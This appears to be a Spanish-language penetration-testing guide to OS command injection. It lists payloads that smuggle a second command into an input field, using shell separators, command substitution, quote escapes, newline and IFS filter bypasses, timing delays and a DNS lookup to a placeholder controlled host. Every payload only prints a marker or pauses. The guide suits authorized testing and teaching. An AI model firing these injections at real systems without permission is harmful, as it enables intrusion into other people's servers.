# 🗡️ Inyección de comandos del sistema: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Separadores POSIX con marcador

```text
127.0.0.1; printf prueba-123
127.0.0.1 && printf prueba-123
127.0.0.1 || printf prueba-123
127.0.0.1 | printf prueba-123
```

**Cuándo usarlo:** Una línea por prueba. && depende del éxito previo; || del fallo. Verificar salida del proceso y no simple reflejo del parámetro.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/os-command-injection).


### Sustitución de comandos POSIX

```text
127.0.0.1$(printf prueba-123)
127.0.0.1`printf prueba-123`
```

**Cuándo usarlo:** Aplicable cuando el dato pasa por un shell y la sustitución cabe en el argumento; comparar con caracteres escapados.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/os-command-injection).


## 🧭 Payloads por contexto

### cmd.exe en Windows

```text
127.0.0.1 & echo prueba-123
127.0.0.1 && echo prueba-123
127.0.0.1 || echo prueba-123
```

**Cuándo usarlo:** Una línea por solicitud a un backend Windows que invoque cmd.exe. Los operadores condicionales dependen del código de salida previo.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/os-command-injection).


### Salir de una cadena entre comillas

```text
127.0.0.1"; printf prueba-123; #
127.0.0.1'; printf prueba-123; #
```

**Cuándo usarlo:** Solo si se conoce el tipo de comilla en la línea de shell POSIX; adaptar cierre y comentario al contexto exacto.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/os-command-injection).


## 🔥 Payloads avanzados

### Ciega con tiempo corto u OAST propio

```text
127.0.0.1; sleep 1
127.0.0.1 & ping -n 2 127.0.0.1
127.0.0.1; nslookup prueba-123.{CONTROLLED_HOST}
```

**Cuándo usarlo:** Pruebas separadas: POSIX, Windows y DNS. Solo con límites de tiempo/tráfico acordados; correlacionar frente a controles y no incluir datos sensibles en DNS.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/os-command-injection).


## 🔬 Pruebas guiadas por escenario

### 1. Separador POSIX ;

**Objetivo:** Valor insertado en línea de shell POSIX, fuera de comillas; emitir marcador sin tocar archivos.

```text
127.0.0.1; printf prueba-123
```

**Interpretación:** Comprobar salida del proceso, no simple eco del parámetro.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md).

### 2. AND condicional

**Objetivo:** El comando anterior debe terminar con éxito.

```text
127.0.0.1 && printf prueba-123
```

**Interpretación:** La ausencia de marcador puede deberse a fallo del comando inicial; comparar con ;.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md).

### 3. Sustitución POSIX $()

**Objetivo:** Útil si el dato queda dentro de otra palabra o argumento con expansión de shell.

```text
127.0.0.1$(printf prueba-123)
```

**Interpretación:** Verificar si el marcador modifica salida o argumento; el texto reflejado sin evaluación no basta.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md).

### 4. Backticks POSIX

**Objetivo:** Variante de sustitución en shells que la admiten.

```text
127.0.0.1`printf prueba-123`
```

**Interpretación:** Comparar con backticks escapados; el proceso de destino debe ejecutar un shell.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md).

### 5. Salto de línea

**Objetivo:** Cuando se bloquea ; pero el shell interpreta LF; usar un único comando inerte.

```text
127.0.0.1%0Aprintf%20prueba-123
```

**Interpretación:** La aplicación debe decodificar %0A antes de invocar shell; probar también control %250A.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md).

### 6. Separador Windows cmd.exe

**Objetivo:** Solo si el backend usa cmd.exe; & ejecuta el siguiente comando.

```text
127.0.0.1 & echo prueba-123
```

**Interpretación:** Confirmar con control que el marcador sale del proceso Windows.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md).

### 7. Ciego por tiempo

**Objetivo:** Solo en laboratorio o ventana pactada; pausa de un segundo.

```text
127.0.0.1; sleep 1
```

**Interpretación:** Comparar medianas con 127.0.0.1 sin pausa; el retardo por red no demuestra ejecución.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md).

### 8. OAST DNS sin datos

**Objetivo:** Laboratorio o permiso expreso; host controlado y marcador único.

```text
127.0.0.1; nslookup prueba-123.{CONTROLLED_HOST}
```

**Interpretación:** Una consulta DNS correlacionada prueba ejecución de comando o de otra capa; revisar origen y logs.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md).

### 9. Pipe POSIX

**Objetivo:** Enviar la salida de la orden inicial a printf; requiere shell POSIX.

```text
127.0.0.1 | printf prueba-123
```

**Interpretación:** El marcador debe provenir del proceso servidor y desaparecer con pipe escapado.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md).

### 10. Separación con IFS

**Objetivo:** Solo para shell compatible cuando el filtro bloquea espacios y ya existe indicio de inyección.

```text
127.0.0.1;printf${IFS}prueba-123
```

**Interpretación:** `${IFS}` debe expandirse en shell; si se refleja literalmente, no hay evaluación.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md).

### 11. PowerShell en Windows

**Objetivo:** Solo si se sabe que el backend invoca PowerShell y no cmd.exe.

```text
127.0.0.1; Write-Output prueba-123
```

**Interpretación:** El separador ; y Write-Output son de PowerShell; confirmar proceso y salida.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md).

### 12. OR condicional tras fallo

**Objetivo:** El primer comando debe fallar de forma controlada; un shell POSIX o cmd.exe interpreta ||.

```text
host-inexistente.invalid || echo prueba-123
```

**Interpretación:** El marcador solo debe aparecer al fallar el primer comando; distingue || de && y de un eco del parámetro.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/os-command-injection).

### 13. Salida de comillas simples POSIX

**Objetivo:** La aplicación usa una construcción como `sh -c "ping -c 1 'ENTRADA'"` en laboratorio.

```text
'; printf prueba-123; #
```

**Interpretación:** El primer carácter cierra la cita; el marcador debe provenir del proceso y no del valor reflejado.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/os-command-injection).

### 14. Salida de comillas dobles POSIX

**Objetivo:** El valor queda dentro de comillas dobles de una cadena pasada a shell.

```text
"; printf prueba-123; #
```

**Interpretación:** Confirmar que se cerró el contexto de comillas y que el resto de la orden quedó comentado.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/os-command-injection).

### 15. Inyección de argumento sin shell

**Objetivo:** Si la aplicación ejecuta `curl` con una URL del usuario como argumento, probar opción inocua.

```text
--help
```

**Interpretación:** Mostrar la ayuda de curl revela interpretación como opción, aunque no haya shell ni ejecución de otro programa.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
